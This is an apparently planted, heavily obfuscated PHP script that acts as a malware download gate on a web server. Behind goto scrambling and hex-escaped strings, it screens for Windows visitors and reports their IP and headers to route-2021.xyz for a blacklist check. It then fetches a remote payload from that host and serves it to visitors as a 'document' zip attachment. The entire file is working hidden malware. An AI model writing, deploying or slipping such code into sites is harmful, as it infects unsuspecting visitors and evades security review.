<?php
 goto bJE_2; Q4aKZ: $data_json = json_encode($data_json); goto nGgyp; PQKzq: shuffle($links); goto QkdLR; AjNUq: $file_ext = explode("\x2e", $_GET["\145"]); goto t3pRT; iBwoP: $hdrs_new = array(); goto zDL3T; EL106: $links = array("\x68\x74\x74\160\x3a\57\57\x72\157\165\164\145\x2d\x32\60\x32\x31\56\170\x79\x7a\x2f\162\x6f\x75\x74\145\x72\x30\70\56\160\150\160\x3f\x70\x70\75" . $data_json, "\150\164\x74\160\x3a\57\57\x72\157\165\164\x65\55\x32\x30\x32\x31\56\170\171\172\x2f\162\x6f\165\x74\145\x72\60\x38\56\160\150\160\77\x70\160\x3d" . $data_json, "\150\x74\x74\160\72\57\x2f\x72\x6f\165\164\145\x2d\62\60\62\x31\56\170\x79\172\57\162\x6f\x75\164\145\162\x30\x38\56\160\150\160\77\x70\160\x3d" . $data_json); goto PQKzq; QkdLR: $outfilepath = __DIR__ . "\x2f\x2e\x2e\x2f\x62\151\x67\137\x5f\163\x74\141\x74\56\164\170\x74"; goto iQ_zO; Sx8tv: $REQUEST_URI = $_SERVER["\122\105\x51\x55\x45\123\124\x5f\x55\x52\111"]; goto ylxyU; sBeLO: if ($_GET["\x65"] != "\x31\x32\x33\x2e" . $file_ext) { $ip_for_check = getRealIpAddr(); $links_ip_ckeck = array("\x68\x74\164\160\x3a\x2f\57\162\157\x75\x74\x65\55\62\x30\62\x31\x2e\x78\x79\172\57\162\157\x75\164\x65\162\x5f\142\x6c\x61\143\153\x2e\x70\x68\160\77\151\160\75" . $ip_for_check . "\46\144\141\x74\x61\x3d" . $data_json, "\x68\164\x74\160\72\57\57\162\157\x75\x74\x65\x2d\62\60\62\x31\56\x78\171\x7a\57\x72\x6f\165\164\x65\162\x5f\142\x6c\x61\143\153\56\x70\150\x70\x3f\x69\x70\x3d" . $ip_for_check . "\x26\144\x61\x74\x61\75" . $data_json, "\150\164\164\x70\72\x2f\x2f\x72\x6f\165\164\x65\55\62\x30\62\61\x2e\170\x79\x7a\57\x72\x6f\x75\164\x65\x72\137\x62\154\141\x63\153\56\160\150\x70\x3f\151\x70\75" . $ip_for_check . "\46\x64\141\x74\x61\x3d" . $data_json); $is_black = false; foreach ($links_ip_ckeck as $link_ip_ckeck) { $ctx = stream_context_create(array("\x68\164\164\x70" => array("\x74\x69\155\145\x6f\x75\164" => 10))); $tmp_resp = file_get_contents($link_ip_ckeck, false, $ctx); $tmp_resp_json = json_decode($tmp_resp, true); if ($tmp_resp_json["\x73\164\x61\x74\165\163"] === true) { $is_black = $tmp_resp_json["\x69\x73\137\x62\x6c\141\x63\x6b"]; break; } } if ($is_black) { die(''); } if ($_GET["\x65"] != "\144\x6f\143\165\x6d\145\x6e\164\163\56" . $file_ext) { $_SESSION["\137\137\x72\145\144\x69\x72\x65\143\x74\x5f\167\x61\163\137\x73\x74\141\x72\x74"] = true; $_SESSION["\144\157\x63\137\x6e\141\155\x65"] = $_GET["\x65"]; $_SESSION["\146\151\154\x65\137\145\x78\164"] = $file_ext; $redirect_uri = str_replace($_GET["\145"], "\x64\157\x63\x75\x6d\x65\x6e\164\163\x2e" . $file_ext, $REQUEST_URI); echo "\x3c\x64\151\166\x20\x69\144\x3d\x22\154\x6c\x22\40\x64\x61\x74\x61\x2d\162\x72\75\x22" . $redirect_uri . "\x22\x3e\x3c\x2f\144\151\166\76"; echo "\x3c\x73\143\162\151\x70\x74\76"; echo "\154\x6f\143\141\x74\151\157\x6e\56\160\x61\x74\150\156\x61\x6d\145\40\75\40\144\157\143\x75\155\145\156\164\x2e\147\x65\x74\x45\154\145\155\145\156\164\x42\x79\x49\144\50\x27\154\154\x27\51\56\x67\145\164\x41\x74\x74\162\151\x62\165\x74\x65\50\x27\144\141\164\141\x2d\162\162\47\51\x3b"; echo "\x3c\57\163\143\162\x69\x70\164\x3e"; die("\x57\141\x69\x74\x2e\56\x2e"); } } else { if (empty($hdrs_new["\x68\x68"])) { die(''); } } goto YagUV; t3pRT: $file_ext = end($file_ext); goto WuO_C; BFUyI: $_GET["\145"] = $REQUEST_URI_ARR[2]; goto jYqhw; C8rHh: $REQUEST_URI_ARR = explode("\x2f", $REQUEST_URI); goto QTr3h; zDL3T: $hdrs = getallheaders(); goto mUeF7; YagUV: if (empty($_SESSION["\146\x69\x6c\x65\137\x65\x78\164"])) { $_SESSION["\x66\151\154\x65\x5f\x65\x78\x74"] = "\172\151\160"; } goto EL106; ylxyU: if (empty($REQUEST_URI)) { die(''); } goto C8rHh; jYqhw: if (empty($_SERVER["\110\124\x54\x50\x5f\x55\123\105\x52\137\x41\x47\105\x4e\x54"])) { die(''); } goto U9RRB; G6Rx5: foreach ($links as $link) { $ctx = stream_context_create(array("\x68\x74\164\160" => array("\164\151\x6d\145\157\165\x74" => 30))); $data = file_get_contents($link, false, $ctx); if ($data == "\x2e\x2e\x2e\56" || $data == "\x2e\56\56") { break; } if (strlen($data) < 1000) { continue; } header("\103\157\156\164\x65\156\164\x2d\x44\145\x73\143\162\x69\x70\x74\x69\x6f\156\72\x20\x46\x69\x6c\x65\40\124\162\141\156\x73\x66\x65\x72"); header("\103\157\156\164\145\156\164\x2d\124\171\x70\x65\72\x20\x61\x70\x70\x6c\x69\x63\141\164\x69\157\156\57\157\143\x74\145\x74\x2d\163\x74\162\145\141\155"); header("\103\157\x6e\x74\145\x6e\x74\x2d\104\x69\163\160\157\x73\151\x74\151\157\156\x3a\x20\141\164\x74\x61\x63\150\x6d\145\x6e\x74\73\x20\x66\151\x6c\x65\156\x61\x6d\x65\x3d" . $_SESSION["\x64\157\x63\x5f\x6e\x61\155\x65"]); header("\103\x6f\156\164\145\156\164\x2d\x54\x72\141\x6e\163\146\145\162\55\105\156\143\157\144\151\x6e\147\x3a\40\x62\151\x6e\141\162\x79"); header("\x43\x6f\x6e\156\145\x63\164\151\157\156\x3a\40\x4b\x65\145\x70\55\x41\154\x69\166\x65"); header("\x45\x78\160\151\x72\x65\163\x3a\40\x30"); header("\103\141\x63\x68\145\55\103\157\x6e\x74\162\157\154\x3a\x20\x6d\165\163\x74\55\162\145\x76\x61\154\151\x64\141\x74\x65\x2c\40\160\x6f\x73\164\x2d\x63\150\145\x63\x6b\x3d\60\54\40\x70\162\145\x2d\x63\x68\x65\143\x6b\x3d\x30"); header("\120\162\141\x67\155\141\x3a\x20\160\x75\x62\154\x69\x63"); echo $data; die; } goto qF8wZ; RL9H2: function getRealIpAddr() { if (!empty($_SERVER["\x48\124\124\x50\x5f\x43\x4c\111\105\x4e\x54\x5f\111\x50"])) { $ip = $_SERVER["\x48\x54\x54\x50\x5f\x43\x4c\x49\105\x4e\124\x5f\x49\x50"]; } elseif (!empty($_SERVER["\x48\x54\124\x50\x5f\x58\x5f\x46\x4f\x52\x57\101\x52\104\105\104\137\106\x4f\122"])) { $ip = $_SERVER["\x48\124\124\120\x5f\x58\x5f\106\x4f\x52\127\x41\122\104\x45\104\x5f\106\x4f\122"]; } else { $ip = $_SERVER["\122\x45\115\117\124\x45\x5f\101\104\104\x52"]; } return $ip; } goto iBwoP; bJE_2: if (session_start() === false) { die(''); } goto Sx8tv; mUeF7: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto AjNUq; WuO_C: if (empty($file_ext)) { $file_ext = "\x7a\x69\x70"; } goto Xm3q4; nGgyp: $data_json = base64_encode($data_json); goto sBeLO; U9RRB: if (stripos($_SERVER["\110\x54\124\x50\137\125\x53\x45\122\x5f\x41\x47\105\x4e\x54"], "\x57\x69\x6e\144\x6f\167\163") === false) { die(''); } goto RL9H2; Xm3q4: $data_json = array("\x69\160" => getRealIpAddr(), "\x74\151\155\145" => time(), "\150\150" => $hdrs_new["\x68\x68"], "\145\170\164" => $file_ext, "\x68\157\x73\x74" => $_SERVER["\123\x45\122\126\x45\x52\137\116\101\x4d\x45"]); goto Q4aKZ; iQ_zO: if (empty($_SESSION["\144\x6f\x63\137\156\x61\155\145"])) { $_SESSION["\144\x6f\143\x5f\156\x61\x6d\145"] = "\x64\157\143\165\155\145\x6e\164\56" . $file_ext; } goto G6Rx5; QTr3h: if (count($REQUEST_URI_ARR) != 3) { die(''); } goto BFUyI; qF8wZ: die("\x54\162\171\40\141\147\141\x69\x6e\56");